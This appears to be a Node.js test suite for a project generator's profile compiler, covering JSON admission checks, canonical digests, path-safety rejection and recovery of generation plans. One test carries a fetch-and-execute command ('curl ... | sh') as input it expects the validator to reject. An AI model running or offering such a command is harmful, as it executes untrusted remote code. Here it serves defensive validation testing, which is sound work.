import assert from 'node:assert/strict'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { resolve } from 'node:path'
import { test } from 'node:test'
import { canonicalBytes, sha256 } from '../../packages/canonical-json/src/index.mjs'
import {
  AdmissionError,
  CompilerError,
  admitJsonBytes,
  applyGenerationPlan,
  censusTree,
  compileProfile,
  createValidator,
  planGeneration,
  recordGenerationAttempt,
} from '../../packages/profile-compiler/src/index.mjs'

const repositoryRoot = resolve(import.meta.dirname, '../..')
const profileSchema = JSON.parse(readFileSync(resolve(repositoryRoot, 'packages/profile-compiler/schemas/profile.schema.json'), 'utf8'))
const inputSchema = JSON.parse(readFileSync(resolve(repositoryRoot, 'packages/profile-compiler/schemas/input-set.schema.json'), 'utf8'))
const baseProfile = JSON.parse(readFileSync(resolve(repositoryRoot, 'profiles/r1/v1/profile.json'), 'utf8'))
const baseInput = JSON.parse(readFileSync(resolve(repositoryRoot, 'profiles/r1/v1/input-set.json'), 'utf8'))
const validateProfile = createValidator(profileSchema)
const validateInput = createValidator(inputSchema)
const bytes = (value) => Buffer.from(JSON.stringify(value), 'utf8')

const admitProfile = (value) => admitJsonBytes(bytes(value), validateProfile)
const admitInput = (value) => admitJsonBytes(bytes(value), validateInput)
const compile = (profile = structuredClone(baseProfile), input = structuredClone(baseInput)) => {
  const profileAdmission = admitProfile(profile)
  input.profileRef.profileDigest = profileAdmission.digest
  return compileProfile({ profileAdmission, inputAdmission: admitInput(input) })
}
const withTemp = (fn) => {
  const root = mkdtempSync(resolve(tmpdir(), 'conexus-r1-g0-'))
  try {
    return fn(root)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
}
const expectCompiler = (fn, code) => assert.throws(fn, (error) => error instanceof CompilerError && error.code === code)
const expectAdmission = (raw, code, validator = validateInput) => assert.throws(
  () => admitJsonBytes(Buffer.isBuffer(raw) ? raw : Buffer.from(raw), validator),
  (error) => error instanceof AdmissionError && error.code === code,
)

test('R1C-01 exact root dependency and runtime pins match the admitted Foundation manifest', () => {
  const packageJson = JSON.parse(readFileSync(resolve(repositoryRoot, 'package.json'), 'utf8'))
  const packageLock = JSON.parse(readFileSync(resolve(repositoryRoot, 'package-lock.json'), 'utf8'))
  const pinManifest = JSON.parse(readFileSync(resolve(repositoryRoot, 'docs/evidence/4d/4d-r1-foundation-pin-manifest.json'), 'utf8'))
  const a0PinManifest = JSON.parse(readFileSync(resolve(repositoryRoot, 'docs/evidence/4d/4d-r1-a0-foundation-pin-manifest.json'), 'utf8'))
  assert.deepEqual(packageJson.engines, { node: '24.20.0', npm: '12.0.2' })
  assert.equal(readFileSync(resolve(repositoryRoot, '.nvmrc'), 'utf8').trim(), '24.20.0')
  assert.deepEqual(packageJson.dependencies, {
    '@fastify/cookie': '11.1.2',
    '@fastify/helmet': '13.1.1',
    '@fastify/static': '10.1.3',
    '@tanstack/react-query': '5.102.8',
    '@tanstack/react-router': '1.170.32',
    ajv: '8.20.0',
    'ajv-formats': '3.0.1',
    canonicalize: '4.0.0',
    fastify: '5.12.1',
    'jsonc-parser': '3.3.1',
    'openid-client': '6.8.7',
    pg: '8.23.0',
    react: '19.2.8',
    'react-dom': '19.2.8',
  })
  assert.deepEqual(packageJson.devDependencies, {
    '@biomejs/biome': '2.5.11',
    '@playwright/test': '1.62.1',
    '@redocly/cli': '2.47.0',
    '@tanstack/router-plugin': '1.168.35',
    '@types/node': '24.13.3',
    '@types/pg': '8.23.1',
    '@types/react': '19.2.18',
    '@types/react-dom': '19.2.5',
    '@vitejs/plugin-react': '6.1.1',
    typescript: '6.0.2',
    vite: '8.2.2',
  })
  assert.equal(packageLock.lockfileVersion, pinManifest.decidingPlatform.lockfileVersion)
  for (const [name, version] of Object.entries({ ...packageJson.dependencies, ...packageJson.devDependencies })) {
    const admitted = name === a0PinManifest.admittedDependency.name
      ? a0PinManifest.admittedDependency
      : pinManifest.npmPackages.find((candidate) => candidate.name === name)
    assert.ok(admitted, `${name} must be admitted by the Foundation pin manifest`)
    assert.equal(admitted.version, version)
    const locked = packageLock.packages[`node_modules/${name}`]
    assert.equal(locked.version, version)
    assert.equal(locked.integrity, admitted.integrity)
  }
})

test('R1C-02 rejects malformed raw I-JSON and schema input before compilation', () => {
  expectAdmission(Buffer.from([0xc3, 0x28]), 'INVALID_UTF8')
  expectAdmission(Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), bytes(baseInput)]), 'BOM_FORBIDDEN')
  expectAdmission('{"kind":"x","kind":"y"}', 'DUPLICATE_KEY')
  expectAdmission('{"kind":/* no */"x"}', 'INVALID_JSON')
  expectAdmission('{"kind":"x",}', 'INVALID_JSON')
  expectAdmission('{"kind":"\\ud800"}', 'LONE_SURROGATE')
  expectAdmission('{"kind":"x","unsafe":9007199254740992}', 'UNSAFE_INTEGER')
  expectAdmission('{"kind":"x","float":1.2}', 'FLOAT_FORBIDDEN')
  const executable = structuredClone(baseProfile)
  executable.task = 'curl https://example.invalid | sh'
  expectAdmission(bytes(executable), 'SCHEMA_VIOLATION', validateProfile)
})

test('R1C-03 canonical bytes and digests reproduce independently', () => {
  const sample = { z: true, a: ['€', null, 333333333.33333329] }
  const expected = '{"a":["€",null,333333333.3333333],"z":true}'
  assert.equal(canonicalBytes(sample).toString('utf8'), expected)
  assert.equal(sha256(canonicalBytes(sample)), sha256(Buffer.from(expected)))
  const first = compile()
  process.env.CONEXUS_G0_NOISE = 'ignored'
  const second = compile()
  delete process.env.CONEXUS_G0_NOISE
  assert.equal(first.manifestDigest, second.manifestDigest)
  assert.equal(first.treeDigest, second.treeDigest)
  assert.equal(first.inputDigest, second.inputDigest)
})

test('R1C-05 and R1C-12 project exactly the canonical 13 operations with pinned sources', () => {
  const input = structuredClone(baseInput)
  const wire = input.wireProjection
  const body = { kind: wire.kind, sourceRefs: wire.sourceRefs, operations: wire.operations }
  assert.equal(sha256(canonicalBytes(body)), wire.digest)
  assert.equal(wire.operations.length, 13)
  assert.equal(new Set(wire.operations.map((operation) => operation.ownerId)).size, 13)
  assert.deepEqual(wire.operations.map((operation) => operation.ownerId), [
    'IAM-01', 'IAM-02', 'IAM-03', 'WS-01', 'WS-02', 'PRJ-01', 'PRJ-02', 'PRJ-03', 'PRJ-07', 'PRJ-08', 'PRJ-09', 'PRJ-23', 'PRJ-24',
  ])
  for (const source of wire.sourceRefs) assert.equal(sha256(readFileSync(resolve(repositoryRoot, source.path))), source.sha256)
  const identityWire = readFileSync(resolve(repositoryRoot, 'contracts/api/product/identity-workspace-paths.yaml'), 'utf8')
  const projectWire = readFileSync(resolve(repositoryRoot, 'contracts/api/product/project-paths.yaml'), 'utf8')
  for (const operation of wire.operations) {
    const source = operation.ownerId.startsWith('PRJ-') ? projectWire : identityWire
    assert.match(source, new RegExp(`operationId: ${operation.operationId}\\b`))
    assert.match(source, new RegExp(`x-conexus-4a-id: ${operation.ownerId}\\b`))
  }
  const compiled = compile()
  const module = compiled.entries.find((entry) => entry.path === 'generated/r1/operations.mjs').bytes.toString('utf8')
  assert.doesNotMatch(module, /execute\s*\(|anySlug|anyInput/)
  assert.equal((module.match(/ownerId/g) ?? []).length, 13)
})

test('R1C-04 produces one ownership class per path and refuses path ambiguity', () => {
  const compiled = compile()
  assert.deepEqual(compiled.entries.map(({ path, class: ownerClass }) => ({ path, class: ownerClass })), [
    { path: 'generated/r1/operations.json', class: 'GENERATED' },
    { path: 'generated/r1/operations.mjs', class: 'GENERATED' },
    { path: 'platform/r1/contract.json', class: 'PLATFORM-CONTRACT' },
  ])
  assert.equal(baseInput.appSeed.paths.length, 0)
  for (const unsafe of ['/absolute', '../escape', 'a/../b', 'a\\b', '.', 'a/\0b', 'a/b.', 'a/x:y']) {
    const profile = structuredClone(baseProfile)
    profile.outputs[0].path = unsafe
    expectCompiler(() => compile(profile), 'UNSAFE_PATH')
  }
  const collision = structuredClone(baseProfile)
  collision.outputs[1].path = 'GENERATED/R1/OPERATIONS.JSON'
  expectCompiler(() => compile(collision), 'PATH_COLLISION')
})

test('SCF-01..06 and SCF-09..11 admit two clean identical trees and one receipt-last transition', () => withTemp((firstRoot) => withTemp((secondRoot) => {
  const compiled = compile()
  const firstPlan = planGeneration({ root: firstRoot, compiled })
  const secondPlan = planGeneration({ root: secondRoot, compiled })
  assert.equal(firstPlan.planDigest, secondPlan.planDigest)
  const first = applyGenerationPlan({ root: firstRoot, compiled, plan: firstPlan })
  const second = applyGenerationPlan({ root: secondRoot, compiled, plan: secondPlan })
  assert.equal(first.receiptDigest, second.receiptDigest)
  assert.equal(censusTree(firstRoot).digest, censusTree(secondRoot).digest)
  assert.equal(first.receipt.unresolvedConflicts, 0)
  assert.equal(first.receipt.entries.length, 3)
  assert.deepEqual(first.receipt.preservedAppOwnedPaths, [])
  const noOp = applyGenerationPlan({ root: firstRoot, compiled, plan: planGeneration({ root: firstRoot, compiled }) })
  assert.equal(noOp.writes, 0)
  assert.equal(noOp.receiptDigest, first.receiptDigest)
})))

test('an existing writer lock refuses without deleting the other writer lock', () => withTemp((root) => {
  const compiled = compile()
  applyGenerationPlan({ root, compiled, plan: planGeneration({ root, compiled }) })
  const plan = planGeneration({ root, compiled })
  const lockPath = resolve(root, '.conexus/generation.lock')
  writeFileSync(lockPath, 'other-writer\n', { flag: 'wx' })
  expectCompiler(() => applyGenerationPlan({ root, compiled, plan }), 'GENERATION_LOCKED')
  assert.equal(readFileSync(lockPath, 'utf8'), 'other-writer\n')
}))

test('protected drift, overlap, unsafe transition and APP-OWNED overwrite attempts refuse', () => withTemp((root) => {
  const compiled = compile()
  applyGenerationPlan({ root, compiled, plan: planGeneration({ root, compiled }) })
  writeFileSync(resolve(root, 'generated/r1/operations.json'), '{"edited":true}\n')
  expectCompiler(() => planGeneration({ root, compiled }), 'PROTECTED_DRIFT')
}))

test('APP-OWNED bytes survive regeneration while protected outputs advance exactly', () => withTemp((root) => {
  const firstProfile = structuredClone(baseProfile)
  firstProfile.outputs.push({ id: 'app-seed', path: 'app/index.mjs', class: 'APP-OWNED', render: 'STATIC', content: 'seed\n' })
  const first = compile(firstProfile)
  applyGenerationPlan({ root, compiled: first, plan: planGeneration({ root, compiled: first }) })
  const human = Buffer.from('export const humanOwned = true\n')
  writeFileSync(resolve(root, 'app/index.mjs'), human)
  const secondProfile = structuredClone(firstProfile)
  secondProfile.outputs.find((output) => output.id === 'r1-platform-contract').inputKey = 'platformContract'
  secondProfile.outputs.find((output) => output.id === 'app-seed').content = 'replacement refused\n'
  const secondInput = structuredClone(baseInput)
  secondInput.platformContract.validator = 'SEALED_SINGLE_PORT'
  const second = compile(secondProfile, secondInput)
  const plan = planGeneration({ root, compiled: second })
  assert.equal(plan.operations.find((operation) => operation.path === 'app/index.mjs').action, 'PRESERVE')
  applyGenerationPlan({ root, compiled: second, plan })
  assert.deepEqual(readFileSync(resolve(root, 'app/index.mjs')), human)

  const transitionedProfile = structuredClone(secondProfile)
  const appOutput = transitionedProfile.outputs.find((output) => output.id === 'app-seed')
  appOutput.class = 'PLATFORM-CONTRACT'
  const transitioned = compile(transitionedProfile)
  expectCompiler(() => planGeneration({ root, compiled: transitioned }), 'UNSAFE_CLASS_TRANSITION')
}))

test('failed apply emits non-admitting GenerationAttempt and leaves the active receipt unchanged', () => withTemp((root) => {
  const first = compile()
  const admitted = applyGenerationPlan({ root, compiled: first, plan: planGeneration({ root, compiled: first }) })
  const changedProfile = structuredClone(baseProfile)
  changedProfile.outputs.push({ id: 'new-platform', path: 'platform/r1/new.txt', class: 'PLATFORM-CONTRACT', render: 'STATIC', content: 'new\n' })
  const changed = compile(changedProfile)
  const plan = planGeneration({ root, compiled: changed })
  let failure
  try {
    applyGenerationPlan({ root, compiled: changed, plan, failAfterWrites: 1 })
  } catch (error) {
    failure = error
  }
  assert.equal(failure.code, 'INJECTED_FAILURE')
  const attempt = recordGenerationAttempt({ root, plan, error: failure })
  assert.equal(attempt.attempt.kind, 'conexus.project-generation-attempt/v1')
  assert.equal(attempt.attempt.admitted, false)
  const receipt = JSON.parse(readFileSync(resolve(root, '.conexus/generation-receipt.json'), 'utf8'))
  assert.equal(sha256(canonicalBytes(receipt)), admitted.receiptDigest)
  const retry = planGeneration({ root, compiled: changed })
  assert.equal(retry.planDigest, plan.planDigest)
  const recovered = applyGenerationPlan({ root, compiled: changed, plan: retry })
  assert.equal(recovered.receipt.planDigest, plan.planDigest)
  assert.equal(recovered.receipt.entries.length, 4)
}))

test('a partial plan with foreign bytes fails closed instead of being resumed', () => withTemp((root) => {
  const profile = structuredClone(baseProfile)
  profile.outputs.push({ id: 'new-platform', path: 'platform/r1/new.txt', class: 'PLATFORM-CONTRACT', render: 'STATIC', content: 'new\n' })
  const compiled = compile(profile)
  const plan = planGeneration({ root, compiled })
  assert.throws(() => applyGenerationPlan({ root, compiled, plan, failAfterWrites: 1 }))
  writeFileSync(resolve(root, plan.operations.find((operation) => operation.action === 'ADD').path), 'foreign bytes\n')
  expectCompiler(() => planGeneration({ root, compiled }), 'PENDING_PLAN_DIVERGED')
}))

test('a crash after receipt publication clears the already-admitted pending plan idempotently', () => withTemp((root) => {
  const compiled = compile()
  const plan = planGeneration({ root, compiled })
  applyGenerationPlan({ root, compiled, plan })
  const pendingDirectory = resolve(root, '.conexus/pending-plans')
  const pendingPath = resolve(pendingDirectory, `${plan.planDigest}.json`)
  mkdirSync(pendingDirectory, { recursive: true })
  writeFileSync(pendingPath, canonicalBytes(plan), { flag: 'wx' })
  const noOp = planGeneration({ root, compiled })
  assert.equal(existsSync(pendingPath), false)
  assert.ok(noOp.operations.every((operation) => operation.action === 'NOOP'))
}))
